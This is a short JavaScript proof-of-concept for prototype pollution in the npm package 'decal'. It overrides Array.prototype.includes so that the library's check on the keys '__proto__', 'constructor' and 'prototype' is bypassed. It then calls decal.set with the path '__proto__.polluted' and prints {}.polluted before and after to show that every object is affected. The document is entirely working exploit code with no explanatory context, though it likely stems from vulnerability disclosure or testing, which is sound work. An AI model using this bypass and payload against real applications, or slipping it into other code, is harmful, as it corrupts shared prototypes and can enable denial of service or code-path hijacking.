Array.prototype.includes = function (key) {
    if (key == '__proto__' || key == 'constructor' || key == 'prototype' || key == 'polluted') {
        return false;
    } else {
        return true;
    }
};
const decal = require('decal');
console.log({}.polluted);
decal.set({}, '__proto__.polluted', 'yes');
console.log({}.polluted);